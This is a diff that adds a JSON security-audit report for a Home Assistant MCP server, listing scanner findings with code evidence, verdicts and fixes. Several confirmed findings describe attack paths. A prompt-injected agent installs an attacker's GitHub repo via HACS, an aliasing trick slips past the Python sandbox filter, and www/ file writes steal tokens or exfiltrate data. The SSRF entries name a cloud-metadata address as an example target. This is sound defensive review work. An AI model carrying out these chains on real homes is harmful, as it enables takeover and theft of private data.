@@ -1,0 +1,494 @@
+[
+ {
+  "rule": "SECRET-IN-CODE",
+  "severity": "info",
+  "file": "src/ha_mcp/config.py",
+  "line": 19,
+  "quote": "DEMO_TOKEN = \"eyJh…ac\"",
+  "message": "JWT found in the source (eyJh…ac). Anyone with the repository (or a tool that reads files) has it.",
+  "confidence": "medium",
+  "owasp": "ASI03 Identity and Privilege Abuse",
+  "fix": "Optional: load the demo token from a docs-only constant or fetch it on demand; keep it scoped to the demo server.",
+  "masked": true,
+  "id": "F001",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/config.py",
+    "line": 17,
+    "quote": "# Demo environment token - use HOMEASSISTANT_TOKEN=\"demo\" to connect to the public demo"
+   },
+   {
+    "file": "src/ha_mcp/config.py",
+    "line": 18,
+    "quote": "# Demo server: https://ha-mcp-demo-server.qc-h.net (login: mcp/mcp, resets weekly)"
+   }
+  ],
+  "reason": "Deliberately published token for the project's public demo instance (whose login is also public and which resets weekly); it grants nothing private. Still make sure it is never the fallback for a real deployment.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "TOOL-POISONING",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_labels.py",
+  "line": 108,
+  "quote": "async def ha_config_set_label(",
+  "message": "Tool 'ha_config_set_label' has a description with hidden or manipulative instructions for the AI (score 35/100): cross-tool-control: 'After creating a label, use ha_set_entity'; names-other-tool: 'ha_set_entity'",
+  "confidence": "medium",
+  "owasp": "ASI01 Agent Goal Hijack / ASI04 Agentic Supply Chain",
+  "fix": "None needed.",
+  "tool": "ha_config_set_label",
+  "signals": [
+   "cross-tool-control",
+   "names-other-tool"
+  ],
+  "id": "F002",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_labels.py",
+    "line": 154,
+    "quote": "After creating a label, use ha_set_entity(labels=[\"label_id\"]) to assign it to entities."
+   }
+  ],
+  "reason": "Ordinary usage guidance explaining how to apply the label the user just created; it does not ask for secrets, hidden steps or overriding arguments.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "TOOL-POISONING",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_search.py",
+  "line": 148,
+  "quote": "async def ha_search_entities(",
+  "message": "Tool 'ha_search_entities' has a description with hidden or manipulative instructions for the AI (score 35/100): cross-tool-control: 'Before performing searches, call ha_get_overview'; names-other-tool: 'ha_get_overview'",
+  "confidence": "medium",
+  "owasp": "ASI01 Agent Goal Hijack / ASI04 Agentic Supply Chain",
+  "fix": "None needed.",
+  "tool": "ha_search_entities",
+  "signals": [
+   "cross-tool-control",
+   "names-other-tool"
+  ],
+  "id": "F003",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_search.py",
+    "line": 168,
+    "quote": "**BEST PRACTICE:** Before performing searches, call ha_get_overview() first to understand:"
+   }
+  ],
+  "reason": "Ordinary usage guidance (read-only overview call to scope the user's own search); not a hidden or manipulative instruction.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "TOOL-POISONING",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_system.py",
+  "line": 54,
+  "quote": "async def ha_check_config() -> dict[str, Any]:",
+  "message": "Tool 'ha_check_config' has a description with hidden or manipulative instructions for the AI (score 35/100): cross-tool-control: 'Always run this before'; names-other-tool: 'ha_restart'",
+  "confidence": "medium",
+  "owasp": "ASI01 Agent Goal Hijack / ASI04 Agentic Supply Chain",
+  "fix": "None needed.",
+  "tool": "ha_check_config",
+  "signals": [
+   "cross-tool-control",
+   "names-other-tool"
+  ],
+  "id": "F004",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_system.py",
+    "line": 59,
+    "quote": "Always run this before ha_restart() to ensure configuration is valid."
+   }
+  ],
+  "reason": "Safety guidance that serves the user (validate config before restarting); it reduces risk rather than redirecting actions.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "SECRET-IN-CODE",
+  "severity": "info",
+  "file": "tests/.env.test",
+  "line": 10,
+  "quote": "HOMEASSISTANT_TOKEN=eyJh…ac",
+  "message": "JWT found in a committed .env file (eyJh…ac). Anyone with the repository (or a tool that reads files) has it.",
+  "confidence": "medium",
+  "owasp": "ASI03 Identity and Privilege Abuse",
+  "fix": "None needed; keep it out of release artifacts.",
+  "masked": true,
+  "id": "F005",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "tests/.env.test",
+    "line": 8,
+    "quote": "# WARNING: This token is for test use only in containerized/CI environments."
+   }
+  ],
+  "reason": "Token for the throw-away Home Assistant test container built from tests/initial_test_state; it is not valid for any real instance.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "NETWORK-EXPOSURE",
+  "severity": "medium",
+  "file": "homeassistant-addon/start.py",
+  "line": 153,
+  "quote": "mcp.run(",
+  "message": "The server listens on all network interfaces (0.0.0.0). Anyone on the network can reach the tools unless authentication is enforced.",
+  "confidence": "medium",
+  "owasp": "ASI03 Identity and Privilege Abuse",
+  "fix": "Bind to the internal add-on network or 127.0.0.1 unless remote access is enabled, require a bearer token header (not a URL path) and enforce a minimum entropy for custom secret_path; use HTTPS/ingress for remote access.",
+  "id": "F006",
+  "verdict": "confirmed",
+  "evidence": [
+   {
+    "file": "homeassistant-addon/start.py",
+    "line": 155,
+    "quote": "host=\"0.0.0.0\","
+   },
+   {
+    "file": "homeassistant-addon/start.py",
+    "line": 157,
+    "quote": "path=secret_path,"
+   },
+   {
+    "file": "homeassistant-addon/config.yaml",
+    "line": 20,
+    "quote": "host_network: true"
+   }
+  ],
+  "reason": "The add-on serves the full admin toolset (Supervisor token) over plain HTTP on every host interface; the only protection is a secret URL path, which is sent in clear text on the LAN, is printed to the add-on log, and can be replaced by a weak user-chosen secret_path.",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_camera.py",
+  "line": 94,
+  "quote": "response = await client.httpx_client.get(endpoint, params=params or None)",
+  "message": "Tool input chooses the URL fetched by client.httpx_client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Optional: validate entity_id against ^camera\\.[a-z0-9_]+$ so it cannot contain '/' or '..'.",
+  "source_line": 23,
+  "source_quote": "async def ha_get_camera_image(",
+  "id": "F007",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_camera.py",
+    "line": 84,
+    "quote": "endpoint = f\"/camera_proxy/{entity_id}\""
+   }
+  ],
+  "reason": "The request goes to a relative path on the operator-configured Home Assistant base URL with the same token the other tools already use; the model cannot choose the host, so this is not SSRF.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_config_dashboards.py",
+  "line": 1376,
+  "quote": "response = await http_client.get(doc_url)",
+  "message": "Tool input chooses the URL fetched by http_client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 1323,
+  "source_quote": "async def ha_get_card_documentation(",
+  "id": "F008",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_config_dashboards.py",
+    "line": 1360,
+    "quote": "if card_type not in card_types_data[\"card_types\"]:"
+   }
+  ],
+  "reason": "card_type must be in a bundled allowlist and the host is a fixed raw.githubusercontent.com base URL.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_updates.py",
+  "line": 587,
+  "quote": "response = await http_client.get(",
+  "message": "Tool input chooses the URL fetched by http_client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 399,
+  "source_quote": "async def ha_get_updates(",
+  "id": "F009",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_updates.py",
+    "line": 574,
+    "quote": "github_pattern = r\"https://github\\.com/([^/]+)/([^/]+)/releases(?:/tag)?/([^/?#]+)\""
+   },
+   {
+    "file": "src/ha_mcp/tools/tools_updates.py",
+    "line": 585,
+    "quote": "api_url = f\"https://api.github.com/repos/{owner}/{repo}/releases/tags/{tag}\""
+   }
+  ],
+  "reason": "Host is fixed to api.github.com and the components come from an anchored github.com regex over the update entity's release_url, not from a free tool argument; no internal address can be reached.",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_updates.py",
+  "line": 627,
+  "quote": "response = await http_client.get(",
+  "message": "Tool input chooses the URL fetched by http_client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 399,
+  "source_quote": "async def ha_get_updates(",
+  "id": "F010",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_updates.py",
+    "line": 614,
+    "quote": "raw_base = f\"https://raw.githubusercontent.com/{owner}/{repo}/{tag}\""
+   }
+  ],
+  "reason": "Fixed public host (raw.githubusercontent.com) with path parts from the same anchored github.com regex; not SSRF.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_updates.py",
+  "line": 672,
+  "quote": "response = await http_client.get(",
+  "message": "Tool input chooses the URL fetched by http_client.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "None needed.",
+  "source_line": 399,
+  "source_quote": "async def ha_get_updates(",
+  "id": "F011",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_updates.py",
+    "line": 670,
+    "quote": "api_url = f\"https://api.github.com/repos/home-assistant/core/releases/tags/{version}\""
+   }
+  ],
+  "reason": "Host and repository are fixed; only the version tag (taken from Home Assistant's update entity) varies.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "SSRF",
+  "severity": "info",
+  "file": "src/ha_mcp/tools/tools_utility.py",
+  "line": 473,
+  "quote": "response = await client_http.get(github_url)",
+  "message": "Tool input chooses the URL fetched by client_http.get. Without an allowlist the agent can be made to call internal services (for example http://169.254.169.254 or localhost admin APIs).",
+  "confidence": "medium",
+  "owasp": "ASI02 Tool Misuse and Exploitation",
+  "fix": "Optional: validate domain against ^[a-z0-9_]+$.",
+  "source_line": 463,
+  "source_quote": "async def ha_get_domain_docs(domain: str) -> dict[str, Any]:",
+  "id": "F012",
+  "verdict": "false_positive",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_utility.py",
+    "line": 468,
+    "quote": "github_url = f\"https://raw.githubusercontent.com/home-assistant/home-assistant.io/refs/heads/current/source/_integrations/{domain}.markdown\""
+   }
+  ],
+  "reason": "The host is fixed to raw.githubusercontent.com; the domain argument only changes the path on that public host, so internal services cannot be reached.",
+  "quotes_verified": 1
+ },
+ {
+  "rule": "DANGEROUS-AGENT-TOOL",
+  "title": "Agent can add any GitHub repo to HACS and install it - arbitrary Python runs inside Home Assistant",
+  "verdict": "confirmed",
+  "severity": "high",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_hacs.py",
+    "line": 564,
+    "quote": "repository: str,"
+   },
+   {
+    "file": "src/ha_mcp/tools/tools_hacs.py",
+    "line": 640,
+    "quote": "\"hacs/repositories/add\","
+   },
+   {
+    "file": "src/ha_mcp/tools/tools_hacs.py",
+    "line": 781,
+    "quote": "response = await ws_client.send_command(\"hacs/repository/download\", **download_kwargs)"
+   }
+  ],
+  "reason": "A prompt-injected agent can call ha_hacs_add_repository('attacker/repo', category='integration'), then ha_hacs_download and ha_restart; the attacker's custom integration is Python that Home Assistant imports with full access to the host, all tokens and devices. The only check is that repository contains '/', and there is no human approval in the server.",
+  "fix": "Disable custom-repository add/download by default behind an explicit feature flag, restrict to HACS default-store repositories or an operator allowlist, and require out-of-band human confirmation before installing integrations/python_scripts.",
+  "id": "M001",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "LLM-OUTPUT-EXECUTED",
+  "title": "python_transform runs model-written Python with exec() behind an AST filter and no time limit",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_config_dashboards.py",
+    "line": 734,
+    "quote": "transformed_config = safe_execute(python_transform, current_config)"
+   },
+   {
+    "file": "src/ha_mcp/utils/python_sandbox.py",
+    "line": 244,
+    "quote": "exec(expr, safe_globals, safe_locals)"
+   },
+   {
+    "file": "src/ha_mcp/utils/python_sandbox.py",
+    "line": 234,
+    "quote": "\"__builtins__\": {},"
+   }
+  ],
+  "reason": "The tool argument is executed in-process; the only protection is an AST allowlist plus empty __builtins__, which the review guide treats as insufficient. The method allowlist is already bypassable by aliasing (`f = config.copy; f()` is a Name call, not an attribute call), and `while True: pass` or `'a' * 10**10`-style input blocks the event loop or exhausts memory, taking the whole MCP server down. No escape to code execution was demonstrated in this review.",
+  "fix": "Replace exec with a declarative patch format (JSON Patch / jq already offered), or run the transform in a separate process with a CPU/memory/time limit; at minimum add a timeout and forbid While.",
+  "id": "M002",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "ha_write_file writes model-chosen content into www/, which Home Assistant serves unauthenticated on its own origin",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_filesystem.py",
+    "line": 339,
+    "quote": "async def ha_write_file("
+   },
+   {
+    "file": "custom_components/ha_mcp_tools/const.py",
+    "line": 7,
+    "quote": "ALLOWED_WRITE_DIRS = [\"www\", \"themes\", \"custom_templates\"]"
+   },
+   {
+    "file": "custom_components/ha_mcp_tools/__init__.py",
+    "line": 403,
+    "quote": "await hass.async_add_executor_job(target_file.write_text, content)"
+   }
+  ],
+  "reason": "Files in www/ are served at /local/ without authentication from the same origin as the HA frontend, so an injected call can drop an HTML/JS page that steals the admin's stored HA tokens when opened, or copy private data into a publicly readable URL as an exfiltration channel. Gated by HAMCP_ENABLE_FILESYSTEM_TOOLS (off by default).",
+  "fix": "Disallow writing .html/.js/.svg (or any executable content type) to www/, or write to a non-served directory; require human confirmation for writes.",
+  "id": "M003",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "TOKEN-PASSTHROUGH",
+  "title": "OAuth access tokens are unsigned base64 JSON containing the user's HA long-lived token, with no expiry",
+  "verdict": "confirmed",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/auth/provider.py",
+    "line": 145,
+    "quote": "No encryption or signing - credentials are readable but transmitted over HTTPS."
+   },
+   {
+    "file": "src/ha_mcp/auth/provider.py",
+    "line": 669,
+    "quote": "ha_token = self._decode_credentials(token)"
+   },
+   {
+    "file": "src/ha_mcp/auth/provider.py",
+    "line": 679,
+    "quote": "expires_at=None,  # Stateless tokens don't expire"
+   }
+  ],
+  "reason": "verify_token accepts any bearer that base64-decodes to {\"ha_token\": ...} and forwards that value to Home Assistant, so the MCP-layer OAuth adds no authentication of its own (HA is the only check), and every MCP client/log that holds the access token holds the raw HA admin token forever; revoking the OAuth grant does nothing.",
+  "fix": "Issue opaque random access tokens (or signed+encrypted JWTs with exp and audience) and keep the HA token server-side, encrypted at rest; enforce expiry and revocation.",
+  "id": "M004",
+  "quotes_verified": 3
+ },
+ {
+  "rule": "TOXIC-FLOW",
+  "title": "Untrusted external text, private home data and outbound actions in one agent with no approval step",
+  "verdict": "needs_context",
+  "severity": "medium",
+  "evidence": [
+   {
+    "file": "src/ha_mcp/tools/tools_updates.py",
+    "line": 149,
+    "quote": "\"release_notes\": _extract_blog_content(blog_resp.text),"
+   },
+   {
+    "file": "src/ha_mcp/tools/tools_service.py",
+    "line": 61,
+    "quote": "async def ha_call_service("
+   }
+  ],
+  "reason": "Tools return third-party text (GitHub/blog release notes, HACS repo info, calendar and to-do items from external accounts) unmarked to the model, the same server exposes cameras, history and config, and ha_call_service can invoke any HA service including notify/rest_command, so injected text can make the agent send private data out. Whether that is reachable depends on which integrations the user has; the server itself has no approval gate.",
+  "fix": "Mark external content as untrusted data in results, let operators restrict ha_call_service to an allowlist of domains (exclude notify/rest_command/shell_command/hassio by default), and document that clients must not auto-approve write tools.",
+  "id": "M005",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "SECRET-IN-LOGS",
+  "title": "Secret URL path (the only auth for the add-ons) is written to the add-on logs",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "homeassistant-addon/start.py",
+    "line": 136,
+    "quote": "log_info(f\"   Secret Path: {secret_path}\")"
+   },
+   {
+    "file": "homeassistant-addon-webhook-proxy/start.py",
+    "line": 628,
+    "quote": "log_info(f\"  MCP target (local): {target_url}\")"
+   }
+  ],
+  "reason": "Anyone who can read add-on logs (other HA admins, diagnostics/bug-report dumps, support pastes) gets the credential that unlocks the full admin MCP server; the proxy even discovers the secret by scraping these logs.",
+  "fix": "Show the URL once in the add-on UI/ingress page instead of logs, mask it in log output, and use a header token rather than a path secret.",
+  "id": "M006",
+  "quotes_verified": 2
+ },
+ {
+  "rule": "PATH-TRAVERSAL",
+  "title": "Containment check uses string startswith without a separator",
+  "verdict": "confirmed",
+  "severity": "low",
+  "evidence": [
+   {
+    "file": "custom_components/ha_mcp_tools/__init__.py",
+    "line": 361,
+    "quote": "rel_path = call.data[\"path\"]"
+   },
+   {
+    "file": "custom_components/ha_mcp_tools/__init__.py",
+    "line": 100,
+    "quote": "return str(resolved).startswith(str(config_resolved))"
+   },
+   {
+    "file": "custom_components/ha_mcp_tools/__init__.py",
+    "line": 376,
+    "quote": "target_file = config_dir / rel_path"
+   }
+  ],
+  "reason": "A symlink inside www/, themes/ or custom_templates/ that resolves to a sibling such as /config-backup still passes the check, and writes use the unresolved path afterwards (TOCTOU). Exploitation needs an existing symlink, so this is hardening.",
+  "fix": "Use resolved.is_relative_to(config_resolved / allowed_dir) and open with O_NOFOLLOW (or re-resolve immediately before the write).",
+  "id": "M007",
+  "quotes_verified": 3
+ }
+]
